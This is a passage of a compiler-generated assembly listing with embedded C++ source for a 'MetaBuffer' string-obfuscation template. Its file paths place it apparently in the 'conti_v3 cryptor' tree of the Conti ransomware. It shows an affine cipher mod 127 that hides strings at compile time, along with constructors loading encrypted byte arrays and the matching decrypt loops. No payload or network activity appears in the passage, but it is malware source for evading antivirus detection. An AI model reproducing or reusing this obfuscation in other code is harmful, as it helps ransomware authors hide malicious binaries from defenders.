; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1f	 mov	 BYTE PTR [rcx+1], 31
  00007	c6 41 02 42	 mov	 BYTE PTR [rcx+2], 66	; 00000042H
  0000b	c6 41 03 47	 mov	 BYTE PTR [rcx+3], 71	; 00000047H
  0000f	c6 41 04 42	 mov	 BYTE PTR [rcx+4], 66	; 00000042H
  00013	c6 41 05 47	 mov	 BYTE PTR [rcx+5], 71	; 00000047H
  00017	c6 41 06 42	 mov	 BYTE PTR [rcx+6], 66	; 00000042H
  0001b	c6 41 07 59	 mov	 BYTE PTR [rcx+7], 89	; 00000059H
  0001f	c6 41 08 42	 mov	 BYTE PTR [rcx+8], 66	; 00000042H
  00023	c6 41 09 43	 mov	 BYTE PTR [rcx+9], 67	; 00000043H
  00027	c6 41 0a 42	 mov	 BYTE PTR [rcx+10], 66	; 00000042H
  0002b	c6 41 0b 68	 mov	 BYTE PTR [rcx+11], 104	; 00000068H
  0002f	c6 41 0c 42	 mov	 BYTE PTR [rcx+12], 66	; 00000042H
  00033	c6 41 0d 18	 mov	 BYTE PTR [rcx+13], 24
  00037	c6 41 0e 42	 mov	 BYTE PTR [rcx+14], 66	; 00000042H
  0003b	c6 41 0f 0d	 mov	 BYTE PTR [rcx+15], 13
  0003f	c6 41 10 42	 mov	 BYTE PTR [rcx+16], 66	; 00000042H
  00043	c6 41 11 14	 mov	 BYTE PTR [rcx+17], 20
  00047	c6 41 12 42	 mov	 BYTE PTR [rcx+18], 66	; 00000042H
  0004b	c6 41 13 77	 mov	 BYTE PTR [rcx+19], 119	; 00000077H
  0004f	c6 41 14 42	 mov	 BYTE PTR [rcx+20], 66	; 00000042H
  00053	c6 41 15 42	 mov	 BYTE PTR [rcx+21], 66	; 00000042H
  00057	c6 41 16 42	 mov	 BYTE PTR [rcx+22], 66	; 00000042H
  0005b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0005f	48 8b c1	 mov	 rax, rcx
  00062	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 2e 00 00
	00		 mov	 r10d, 46		; 0000002eH
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 55 00 00 00	 mov	 eax, 85			; 00000055H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 15	 mov	 BYTE PTR [rcx+1], 21
  00007	c6 41 02 55	 mov	 BYTE PTR [rcx+2], 85	; 00000055H
  0000b	c6 41 03 15	 mov	 BYTE PTR [rcx+3], 21
  0000f	c6 41 04 55	 mov	 BYTE PTR [rcx+4], 85	; 00000055H
  00013	c6 41 05 76	 mov	 BYTE PTR [rcx+5], 118	; 00000076H
  00017	c6 41 06 55	 mov	 BYTE PTR [rcx+6], 85	; 00000055H
  0001b	c6 41 07 3b	 mov	 BYTE PTR [rcx+7], 59	; 0000003bH
  0001f	c6 41 08 55	 mov	 BYTE PTR [rcx+8], 85	; 00000055H
  00023	c6 41 09 35	 mov	 BYTE PTR [rcx+9], 53	; 00000035H
  00027	c6 41 0a 55	 mov	 BYTE PTR [rcx+10], 85	; 00000055H
  0002b	c6 41 0b 43	 mov	 BYTE PTR [rcx+11], 67	; 00000043H
  0002f	c6 41 0c 55	 mov	 BYTE PTR [rcx+12], 85	; 00000055H
  00033	c6 41 0d 29	 mov	 BYTE PTR [rcx+13], 41	; 00000029H
  00037	c6 41 0e 55	 mov	 BYTE PTR [rcx+14], 85	; 00000055H
  0003b	c6 41 0f 1f	 mov	 BYTE PTR [rcx+15], 31
  0003f	c6 41 10 55	 mov	 BYTE PTR [rcx+16], 85	; 00000055H
  00043	c6 41 11 21	 mov	 BYTE PTR [rcx+17], 33	; 00000021H
  00047	c6 41 12 55	 mov	 BYTE PTR [rcx+18], 85	; 00000055H
  0004b	c6 41 13 3b	 mov	 BYTE PTR [rcx+19], 59	; 0000003bH
  0004f	c6 41 14 55	 mov	 BYTE PTR [rcx+20], 85	; 00000055H
  00053	c6 41 15 58	 mov	 BYTE PTR [rcx+21], 88	; 00000058H
  00057	c6 41 16 55	 mov	 BYTE PTR [rcx+22], 85	; 00000055H
  0005b	c6 41 17 3b	 mov	 BYTE PTR [rcx+23], 59	; 0000003bH
  0005f	c6 41 18 55	 mov	 BYTE PTR [rcx+24], 85	; 00000055H
  00063	c6 41 19 1d	 mov	 BYTE PTR [rcx+25], 29
  00067	c6 41 1a 55	 mov	 BYTE PTR [rcx+26], 85	; 00000055H
  0006b	c6 41 1b 27	 mov	 BYTE PTR [rcx+27], 39	; 00000027H
  0006f	c6 41 1c 55	 mov	 BYTE PTR [rcx+28], 85	; 00000055H
  00073	c6 41 1d 29	 mov	 BYTE PTR [rcx+29], 41	; 00000029H
  00077	c6 41 1e 55	 mov	 BYTE PTR [rcx+30], 85	; 00000055H
  0007b	c6 41 1f 3f	 mov	 BYTE PTR [rcx+31], 63	; 0000003fH
  0007f	c6 41 20 55	 mov	 BYTE PTR [rcx+32], 85	; 00000055H
  00083	c6 41 21 21	 mov	 BYTE PTR [rcx+33], 33	; 00000021H
  00087	c6 41 22 55	 mov	 BYTE PTR [rcx+34], 85	; 00000055H
  0008b	c6 41 23 1d	 mov	 BYTE PTR [rcx+35], 29
  0008f	c6 41 24 55	 mov	 BYTE PTR [rcx+36], 85	; 00000055H
  00093	c6 41 25 3f	 mov	 BYTE PTR [rcx+37], 63	; 0000003fH
  00097	c6 41 26 55	 mov	 BYTE PTR [rcx+38], 85	; 00000055H
  0009b	c6 41 27 41	 mov	 BYTE PTR [rcx+39], 65	; 00000041H
  0009f	c6 41 28 55	 mov	 BYTE PTR [rcx+40], 85	; 00000055H
  000a3	c6 41 29 3b	 mov	 BYTE PTR [rcx+41], 59	; 0000003bH
  000a7	c6 41 2a 55	 mov	 BYTE PTR [rcx+42], 85	; 00000055H
  000ab	c6 41 2b 21	 mov	 BYTE PTR [rcx+43], 33	; 00000021H
  000af	c6 41 2c 55	 mov	 BYTE PTR [rcx+44], 85	; 00000055H
  000b3	c6 41 2d 55	 mov	 BYTE PTR [rcx+45], 85	; 00000055H
  000b7	c6 41 2e 55	 mov	 BYTE PTR [rcx+46], 85	; 00000055H
  000bb	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  000bf	48 8b c1	 mov	 rax, rcx
  000c2	c3		 ret	 0
??0?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 27	 sub	 eax, 39			; 00000027H
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 27	 add	 r8d, 39			; 00000027H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
